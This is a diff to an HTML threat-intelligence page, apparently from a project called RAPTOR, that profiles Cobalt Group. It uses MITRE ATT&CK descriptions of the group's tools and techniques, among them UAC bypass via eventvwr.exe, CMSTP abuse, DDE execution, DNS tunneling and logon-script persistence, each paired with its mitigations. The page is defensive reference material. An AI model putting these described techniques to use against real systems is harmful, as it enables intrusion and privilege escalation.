@@ -2,83 +2,87 @@
 <!DOCTYPE html>
 <html>
   <head>
+    <meta charset="utf-8">
     <link rel="stylesheet" href="RAPTOR.css">
     <link rel="shortcut icon" href="./images/favicon.ico" type="image/x-icon">
     <title>Cobalt Group</title>
   </head>
   <body>
     <div class="container">
-      <div id="navmenu">
+      <div class="navmenu">
         <ul>
           <li><a href="index.html">Print All</a></li>
-          <li><a href="index.html">About</a></li>
+          <li><a href="about.html">About</a></li>
           <li class="left"><a href="index.html"><img src="./images/raptor.png" id="logo"></a></li>
         </ul>
       </div>
-      <div id="groupmenu">
-        <h2>90+%</h2>
-          <p><a href="G0130.html">Ajax Security Team</a></p>
-        <h2>80% - 89%</h2>
-          <p><a href="G0032.html">Lazarus Group</a></p>
-        <h2>70% - 79%</h2>
-          <p><a href="G0035.html">Dragonfly</a></p>
-        <h2>60% - 69%</h2>
-          <p><a href="G0006.html">APT1</a></p>
-          <p><a href="G0080.html">Cobalt Group</a></p>
-        <h2>50% - 59%</h2>
-          <p><a href="G0100.html">Inception</a></p>
-          <p><a href="G0125.html">HAFNIUM</a></p>
+      <div class="groupmenu">
+        <div>
+          <h2>90+%</h2>
+            <p><a href="G0130.html">Ajax Security Team</a></p>
+          <h2>80% - 89%</h2>
+            <p><a href="G0032.html">Lazarus Group</a></p>
+          <h2>70% - 79%</h2>
+            <p><a href="G0035.html">Dragonfly</a></p>
+          <h2>60% - 69%</h2>
+            <p><a href="G0006.html">APT1</a></p>
+            <p><a href="G0080.html">Cobalt Group</a></p>
+          <h2>50% - 59%</h2>
+            <p><a href="G0100.html">Inception</a></p>
+            <p><a href="G0125.html">HAFNIUM</a></p>
+    </div>
       </div>
-      <div id="groupinfo">
-        <h1>Cobalt Group</h1>
-          <p>[<a href="https://attack.mitre.org/groups/G0080">Cobalt Group</a>] is a financially motivated threat group that has primarily targeted financial institutions since at least 2016. The group has conducted intrusions to steal money via targeting ATM systems, card processing, payment systems and SWIFT systems. [<a href="https://attack.mitre.org/groups/G0080">Cobalt Group</a>] has mainly targeted banks in Eastern Europe, Central Asia, and Southeast Asia. One of the alleged leaders was arrested in Spain in early 2018, but the group still appears to be active. The group has been known to target organizations in order to use their access to then compromise additional victims. Reporting indicates there may be links between [<a href="https://attack.mitre.org/groups/G0080">Cobalt Group</a>] and both the malware [<a href="https://attack.mitre.org/software/S0030">Carbanak</a>] and the group [<a href="https://attack.mitre.org/groups/G0008">Carbanak</a>].</p>
-        <h2>Associated Groups</h2>
-          <p>Cobalt Gang, Cobalt Spider, GOLD KINGSWOOD</p>
-        <button id ="button1" class="collapsible">Software</button>
-          <div class="content">
-            <button id="button2" class="collapsible">Cobalt Strike</button>
-              <div class="content">
-                <p>[<a href="https://attack.mitre.org/software/S0154">Cobalt Strike</a>] is a commercial, full-featured, remote access tool that bills itself as “adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors”. Cobalt Strike’s interactive post-exploit capabilities cover the full range of ATT&CK tactics, all executed within a single, integrated system.
+      <div class="groupinfo">
+        <div>
+          <h1>Cobalt Group</h1>
+            <p>[<a href="https://attack.mitre.org/groups/G0080">Cobalt Group</a>] is a financially motivated threat group that has primarily targeted financial institutions since at least 2016. The group has conducted intrusions to steal money via targeting ATM systems, card processing, payment systems and SWIFT systems. [<a href="https://attack.mitre.org/groups/G0080">Cobalt Group</a>] has mainly targeted banks in Eastern Europe, Central Asia, and Southeast Asia. One of the alleged leaders was arrested in Spain in early 2018, but the group still appears to be active. The group has been known to target organizations in order to use their access to then compromise additional victims. Reporting indicates there may be links between [<a href="https://attack.mitre.org/groups/G0080">Cobalt Group</a>] and both the malware [<a href="https://attack.mitre.org/software/S0030">Carbanak</a>] and the group [<a href="https://attack.mitre.org/groups/G0008">Carbanak</a>].</p>
+          <h2>Associated Groups</h2>
+            <p>Cobalt Gang, Cobalt Spider, GOLD KINGSWOOD</p>
+          <button id ="button1" class="collapsible">Software</button>
+            <div class="content">
+              <button id="button2" class="collapsible">Cobalt Strike</button>
+                <div class="content">
+                  <p>[<a href="https://attack.mitre.org/software/S0154">Cobalt Strike</a>] is a commercial, full-featured, remote access tool that bills itself as “adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors”. Cobalt Strike’s interactive post-exploit capabilities cover the full range of ATT&CK tactics, all executed within a single, integrated system.
 
 In addition to its own capabilities, [<a href="https://attack.mitre.org/software/S0154">Cobalt Strike</a>] leverages the capabilities of other well-known tools such as Metasploit and [<a href="https://attack.mitre.org/software/S0002">Mimikatz</a>].</p>
-              </div>
-            <button id="button2" class="collapsible">Mimikatz</button>
-              <div class="content">
-                <p>[<a href="https://attack.mitre.org/software/S0002">Mimikatz</a>] is a credential dumper capable of obtaining plaintext Windows account logins and passwords, along with many other features that make it useful for testing the security of networks.  </p>
-              </div>
-            <button id="button2" class="collapsible">More_eggs</button>
-              <div class="content">
-                <p>[<a href="https://attack.mitre.org/software/S0284">More_eggs</a>] is a JScript backdoor used by [<a href="https://attack.mitre.org/groups/G0080">Cobalt Group</a>] and [<a href="https://attack.mitre.org/groups/G0037">FIN6</a>]. Its name was given based on the variable "More_eggs" being present in its code. There are at least two different versions of the backdoor being used, version 2.0 and version 4.4. </p>
-              </div>
-            <button id="button2" class="collapsible">PsExec</button>
-              <div class="content">
-                <p>[<a href="https://attack.mitre.org/software/S0029">PsExec</a>] is a free Microsoft tool that can be used to execute a program on another computer. It is used by IT administrators and attackers.  </p>
-              </div>
-            <button id="button2" class="collapsible">SDelete</button>
-              <div class="content">
-                <p>[<a href="https://attack.mitre.org/software/S0195">SDelete</a>] is an application that securely deletes data in a way that makes it unrecoverable. It is part of the Microsoft Sysinternals suite of tools. </p>
-              </div>
-            <button id="button2" class="collapsible">SpicyOmelette</button>
-              <div class="content">
-                <p>[<a href="https://attack.mitre.org/software/S0646">SpicyOmelette</a>] is a JavaScript based remote access tool that has been used by [<a href="https://attack.mitre.org/groups/G0080">Cobalt Group</a>] since at least 2018.</p>
-              </div>
-          </div>
-        <button id ="button1" class="collapsible">Techniques</button>
-          <div class="content">
-          <button id="button2" class="collapsible">Encrypted Channel: Asymmetric Cryptography</button>
-            <div class="content">
-              <p>Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver’s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.
-
-For efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as [<a href="https://attack.mitre.org/techniques/T1573/002">Asymmetric Cryptography</a>].</p>
-              <button id="button3" class="collapsible">Mitigations</button>
+                </div>
+              <button id="button2" class="collapsible">Mimikatz</button>
                 <div class="content">
-                  <p>Network Intrusion Prevention - Use intrusion detection signatures to block traffic at network boundaries.</p>
-                  <p>SSL/TLS Inspection - Break and inspect SSL/TLS sessions to look at encrypted web traffic for adversary activity.</p>
+                  <p>[<a href="https://attack.mitre.org/software/S0002">Mimikatz</a>] is a credential dumper capable of obtaining plaintext Windows account logins and passwords, along with many other features that make it useful for testing the security of networks.  </p>
+                </div>
+              <button id="button2" class="collapsible">More_eggs</button>
+                <div class="content">
+                  <p>[<a href="https://attack.mitre.org/software/S0284">More_eggs</a>] is a JScript backdoor used by [<a href="https://attack.mitre.org/groups/G0080">Cobalt Group</a>] and [<a href="https://attack.mitre.org/groups/G0037">FIN6</a>]. Its name was given based on the variable "More_eggs" being present in its code. There are at least two different versions of the backdoor being used, version 2.0 and version 4.4. </p>
+                </div>
+              <button id="button2" class="collapsible">PsExec</button>
+                <div class="content">
+                  <p>[<a href="https://attack.mitre.org/software/S0029">PsExec</a>] is a free Microsoft tool that can be used to execute a program on another computer. It is used by IT administrators and attackers.  </p>
+                </div>
+              <button id="button2" class="collapsible">SDelete</button>
+                <div class="content">
+                  <p>[<a href="https://attack.mitre.org/software/S0195">SDelete</a>] is an application that securely deletes data in a way that makes it unrecoverable. It is part of the Microsoft Sysinternals suite of tools. </p>
+                </div>
+              <button id="button2" class="collapsible">SpicyOmelette</button>
+                <div class="content">
+                  <p>[<a href="https://attack.mitre.org/software/S0646">SpicyOmelette</a>] is a JavaScript based remote access tool that has been used by [<a href="https://attack.mitre.org/groups/G0080">Cobalt Group</a>] since at least 2018.</p>
                 </div>
             </div>
-          <button id="button2" class="collapsible">Abuse Elevation Control Mechanism: Bypass User Account Control</button>
+          <button id ="button1" class="collapsible">Techniques</button>
             <div class="content">
-              <p>Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action. 
+            <button id="button2" class="collapsible">Encrypted Channel: Asymmetric Cryptography</button>
+              <div class="content">
+                <p>Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver’s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.
+
+For efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as [<a href="https://attack.mitre.org/techniques/T1573/002">Asymmetric Cryptography</a>].</p>
+                <button id="button3" class="collapsible">Mitigations</button>
+                  <div class="content">
+                    <p>Network Intrusion Prevention - Use intrusion detection signatures to block traffic at network boundaries.</p>
+                    <p>SSL/TLS Inspection - Break and inspect SSL/TLS sessions to look at encrypted web traffic for adversary activity.</p>
+                  </div>
+              </div>
+            <button id="button2" class="collapsible">Abuse Elevation Control Mechanism: Bypass User Account Control</button>
+              <div class="content">
+                <p>Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action. 
 
 If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [<a href="https://attack.mitre.org/techniques/T1559/001">Component Object Model</a>] objects without prompting the user through the UAC notification box.   An example of this is use of [<a href="https://attack.mitre.org/techniques/T1218/011">Rundll32</a>] to load a specifically crafted DLL which loads an auto-elevated [<a href="https://attack.mitre.org/techniques/T1559/001">Component Object Model</a>] object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.
 
@@ -87,67 +91,67 @@ Many methods have been discovered to bypass UAC. The Github readme page for UACM
 * <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.
 
 Another bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.</p>
-              <button id="button3" class="collapsible">Mitigations</button>
-                <div class="content">
-                  <p>Audit - Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses.</p>
-                  <p>Privileged Account Management - Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.</p>
-                  <p>Update Software - Perform regular software updates to mitigate exploitation risk.</p>
-                  <p>User Account Control - Configure Windows User Account Control to mitigate risk of adversaries obtaining elevated process access.</p>
-                </div>
-            </div>
-          <button id="button2" class="collapsible">Signed Binary Proxy Execution: CMSTP</button>
-            <div class="content">
-              <p>Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles.  CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.
+                <button id="button3" class="collapsible">Mitigations</button>
+                  <div class="content">
+                    <p>Audit - Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses.</p>
+                    <p>Privileged Account Management - Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.</p>
+                    <p>Update Software - Perform regular software updates to mitigate exploitation risk.</p>
+                    <p>User Account Control - Configure Windows User Account Control to mitigate risk of adversaries obtaining elevated process access.</p>
+                  </div>
+              </div>
+            <button id="button2" class="collapsible">Signed Binary Proxy Execution: CMSTP</button>
+              <div class="content">
+                <p>Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles.  CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.
 
 Adversaries may supply CMSTP.exe with INF files infected with malicious commands.  Similar to [<a href="https://attack.mitre.org/techniques/T1218/010">Regsvr32</a>] / ”Squiblydoo”, CMSTP.exe may be abused to load and execute DLLs   and/or COM scriptlets (SCT) from remote servers.    This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate, signed Microsoft application.
 
 CMSTP.exe can also be abused to [<a href="https://attack.mitre.org/techniques/T1548/002">Bypass User Account Control</a>] and execute arbitrary commands from a malicious INF through an auto-elevated COM interface.   </p>
-              <button id="button3" class="collapsible">Mitigations</button>
-                <div class="content">
-                  <p>Disable or Remove Feature or Program - Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.</p>
-                  <p>Execution Prevention - Block execution of code on a system through application control, and/or script blocking.</p>
-                </div>
-            </div>
-          <button id="button2" class="collapsible">Supply Chain Compromise: Compromise Software Supply Chain</button>
-            <div class="content">
-              <p>Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.
+                <button id="button3" class="collapsible">Mitigations</button>
+                  <div class="content">
+                    <p>Disable or Remove Feature or Program - Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.</p>
+                    <p>Execution Prevention - Block execution of code on a system through application control, and/or script blocking.</p>
+                  </div>
+              </div>
+            <button id="button2" class="collapsible">Supply Chain Compromise: Compromise Software Supply Chain</button>
+              <div class="content">
+                <p>Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.
 
 Targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.   </p>
-              <button id="button3" class="collapsible">Mitigations</button>
-                <div class="content">
-                  <p>Update Software - Perform regular software updates to mitigate exploitation risk.</p>
-                  <p>Vulnerability Scanning - Vulnerability scanning is used to find potentially exploitable software vulnerabilities to remediate them.</p>
-                </div>
-            </div>
-          <button id="button2" class="collapsible">Application Layer Protocol: DNS</button>
-            <div class="content">
-              <p>Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. 
+                <button id="button3" class="collapsible">Mitigations</button>
+                  <div class="content">
+                    <p>Update Software - Perform regular software updates to mitigate exploitation risk.</p>
+                    <p>Vulnerability Scanning - Vulnerability scanning is used to find potentially exploitable software vulnerabilities to remediate them.</p>
+                  </div>
+              </div>
+            <button id="button2" class="collapsible">Application Layer Protocol: DNS</button>
+              <div class="content">
+                <p>Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. 
 
 The DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. </p>
-              <button id="button3" class="collapsible">Mitigations</button>
-                <div class="content">
-                  <p>Filter Network Traffic - Use network appliances to filter ingress or egress traffic and perform protocol-based filtering. Configure software on endpoints to filter network traffic.</p>
-                  <p>Network Intrusion Prevention - Use intrusion detection signatures to block traffic at network boundaries.</p>
-                </div>
-            </div>
-          <button id="button2" class="collapsible">Inter-Process Communication: Dynamic Data Exchange</button>
-            <div class="content">
-              <p>Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.
+                <button id="button3" class="collapsible">Mitigations</button>
+                  <div class="content">
+                    <p>Filter Network Traffic - Use network appliances to filter ingress or egress traffic and perform protocol-based filtering. Configure software on endpoints to filter network traffic.</p>
+                    <p>Network Intrusion Prevention - Use intrusion detection signatures to block traffic at network boundaries.</p>
+                  </div>
+              </div>
+            <button id="button2" class="collapsible">Inter-Process Communication: Dynamic Data Exchange</button>
+              <div class="content">
+                <p>Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.
 
 Object Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by [<a href="https://attack.mitre.org/techniques/T1559/001">Component Object Model</a>], DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.   
 
 Microsoft Office documents can be poisoned with DDE commands  , directly or through embedded files , and used to deliver execution via [<a href="https://attack.mitre.org/techniques/T1566">Phishing</a>] campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros.  DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a [<a href="https://attack.mitre.org/techniques/T1059">Command and Scripting Interpreter</a>]. DDE execution can be invoked remotely via [<a href="https://attack.mitre.org/techniques/T1021">Remote Services</a>] such as [<a href="https://attack.mitre.org/techniques/T1021/003">Distributed Component Object Model</a>] (DCOM).</p>
-              <button id="button3" class="collapsible">Mitigations</button>
-                <div class="content">
-                  <p>Application Isolation and Sandboxing - Restrict execution of code to a virtual environment on or in transit to an endpoint system.</p>
-                  <p>Behavior Prevention on Endpoint - Use capabilities to prevent suspicious behavior patterns from occurring on endpoint systems. This could include suspicious process, file, API call, etc. behavior.</p>
-                  <p>Disable or Remove Feature or Program - Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.</p>
-                  <p>Software Configuration - Implement configuration changes to software (other than the operating system) to mitigate security risks associated to how the software operates.</p>
-                </div>
-            </div>
-          <button id="button2" class="collapsible">Exploitation for Client Execution</button>
-            <div class="content">
-              <p>Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.
+                <button id="button3" class="collapsible">Mitigations</button>
+                  <div class="content">
+                    <p>Application Isolation and Sandboxing - Restrict execution of code to a virtual environment on or in transit to an endpoint system.</p>
+                    <p>Behavior Prevention on Endpoint - Use capabilities to prevent suspicious behavior patterns from occurring on endpoint systems. This could include suspicious process, file, API call, etc. behavior.</p>
+                    <p>Disable or Remove Feature or Program - Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.</p>
+                    <p>Software Configuration - Implement configuration changes to software (other than the operating system) to mitigate security risks associated to how the software operates.</p>
+                  </div>
+              </div>
+            <button id="button2" class="collapsible">Exploitation for Client Execution</button>
+              <div class="content">
+                <p>Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.
 
 Several types exist:
 
@@ -162,181 +166,181 @@ Common office and productivity applications such as Microsoft Office are also ta
 ### Common Third-party Applications
 
 Other applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.</p>
-              <button id="button3" class="collapsible">Mitigations</button>
-                <div class="content">
-                  <p>Application Isolation and Sandboxing - Restrict execution of code to a virtual environment on or in transit to an endpoint system.</p>
-                  <p>Exploit Protection - Use capabilities to detect and block conditions that may lead to or be indicative of a software exploit occurring.</p>
-                </div>
-            </div>
-          <button id="button2" class="collapsible">Exploitation for Privilege Escalation</button>
-            <div class="content">
-              <p>Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.
+                <button id="button3" class="collapsible">Mitigations</button>
+                  <div class="content">
+                    <p>Application Isolation and Sandboxing - Restrict execution of code to a virtual environment on or in transit to an endpoint system.</p>
+                    <p>Exploit Protection - Use capabilities to detect and block conditions that may lead to or be indicative of a software exploit occurring.</p>
+                  </div>
+              </div>
+            <button id="button2" class="collapsible">Exploitation for Privilege Escalation</button>
+              <div class="content">
+                <p>Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.
 
 When initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.
 
 Adversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD). Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [<a href="https://attack.mitre.org/techniques/T1105">Ingress Tool Transfer</a>] or [<a href="https://attack.mitre.org/techniques/T1570">Lateral Tool Transfer</a>].</p>
-              <button id="button3" class="collapsible">Mitigations</button>
-                <div class="content">
-                  <p>Application Isolation and Sandboxing - Restrict execution of code to a virtual environment on or in transit to an endpoint system.</p>
-                  <p>Execution Prevention - Block execution of code on a system through application control, and/or script blocking.</p>
-                  <p>Exploit Protection - Use capabilities to detect and block conditions that may lead to or be indicative of a software exploit occurring.</p>
-                  <p>Threat Intelligence Program - A threat intelligence program helps an organization generate their own threat intelligence information and track trends to inform defensive priorities to mitigate risk.</p>
-                  <p>Update Software - Perform regular software updates to mitigate exploitation risk.</p>
-                </div>
-            </div>
-          <button id="button2" class="collapsible">Indicator Removal on Host: File Deletion</button>
-            <div class="content">
-              <p>Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.
+                <button id="button3" class="collapsible">Mitigations</button>
+                  <div class="content">
+                    <p>Application Isolation and Sandboxing - Restrict execution of code to a virtual environment on or in transit to an endpoint system.</p>
+                    <p>Execution Prevention - Block execution of code on a system through application control, and/or script blocking.</p>
+                    <p>Exploit Protection - Use capabilities to detect and block conditions that may lead to or be indicative of a software exploit occurring.</p>
+                    <p>Threat Intelligence Program - A threat intelligence program helps an organization generate their own threat intelligence information and track trends to inform defensive priorities to mitigate risk.</p>
+                    <p>Update Software - Perform regular software updates to mitigate exploitation risk.</p>
+                  </div>
+              </div>
+            <button id="button2" class="collapsible">Indicator Removal on Host: File Deletion</button>
+              <div class="content">
+                <p>Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.
 
 There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples include native [<a href="https://attack.mitre.org/software/S0106">cmd</a>] functions such as DEL, secure deletion tools such as Windows Sysinternals SDelete, or other third-party file deletion tools. </p>
-            </div>
-          <button id="button2" class="collapsible">Ingress Tool Transfer</button>
-            <div class="content">
-              <p>Adversaries may transfer tools or other files from an external system into a compromised environment. Files may be copied from an external adversary controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.</p>
-              <button id="button3" class="collapsible">Mitigations</button>
-                <div class="content">
-                  <p>Network Intrusion Prevention - Use intrusion detection signatures to block traffic at network boundaries.</p>
-                </div>
-            </div>
-          <button id="button2" class="collapsible">Command and Scripting Interpreter: JavaScript</button>
-            <div class="content">
-              <p>Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.
+              </div>
+            <button id="button2" class="collapsible">Ingress Tool Transfer</button>
+              <div class="content">
+                <p>Adversaries may transfer tools or other files from an external system into a compromised environment. Files may be copied from an external adversary controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.</p>
+                <button id="button3" class="collapsible">Mitigations</button>
+                  <div class="content">
+                    <p>Network Intrusion Prevention - Use intrusion detection signatures to block traffic at network boundaries.</p>
+                  </div>
+              </div>
+            <button id="button2" class="collapsible">Command and Scripting Interpreter: JavaScript</button>
+              <div class="content">
+                <p>Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.
 
 JScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the [<a href="https://attack.mitre.org/techniques/T1559/001">Component Object Model</a>] and Internet Explorer HTML Application (HTA) pages.
 
 JavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple’s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple’s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple’s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and [<a href="https://attack.mitre.org/techniques/T1059/002">AppleScript</a>]. Scripts can be executed via the command line utility <code>osascript</code>, they can be compiled into applications or script files via <code>osacompile</code>, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.
 
 Adversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a [<a href="https://attack.mitre.org/techniques/T1189">Drive-by Compromise</a>] or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of [<a href="https://attack.mitre.org/techniques/T1027">Obfuscated Files or Information</a>].</p>
-              <button id="button3" class="collapsible">Mitigations</button>
-                <div class="content">
-                  <p>Behavior Prevention on Endpoint - Use capabilities to prevent suspicious behavior patterns from occurring on endpoint systems. This could include suspicious process, file, API call, etc. behavior.</p>
-                  <p>Disable or Remove Feature or Program - Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.</p>
-                  <p>Execution Prevention - Block execution of code on a system through application control, and/or script blocking.</p>
-                  <p>Restrict Web-Based Content - Restrict use of certain websites, block downloads/attachments, block Javascript, restrict browser extensions, etc.</p>
-                </div>
-            </div>
-          <button id="button2" class="collapsible">Boot or Logon Initialization Scripts: Logon Script (Windows)</button>
-            <div class="content">
-              <p>Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system. This is done via adding a path to a script to the <code>HKCU\Environment\UserInitMprLogonScript</code> Registry key.
+                <button id="button3" class="collapsible">Mitigations</button>
+                  <div class="content">
+                    <p>Behavior Prevention on Endpoint - Use capabilities to prevent suspicious behavior patterns from occurring on endpoint systems. This could include suspicious process, file, API call, etc. behavior.</p>
+                    <p>Disable or Remove Feature or Program - Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.</p>
+                    <p>Execution Prevention - Block execution of code on a system through application control, and/or script blocking.</p>
+                    <p>Restrict Web-Based Content - Restrict use of certain websites, block downloads/attachments, block Javascript, restrict browser extensions, etc.</p>
+                  </div>
+              </div>
+            <button id="button2" class="collapsible">Boot or Logon Initialization Scripts: Logon Script (Windows)</button>
+              <div class="content">
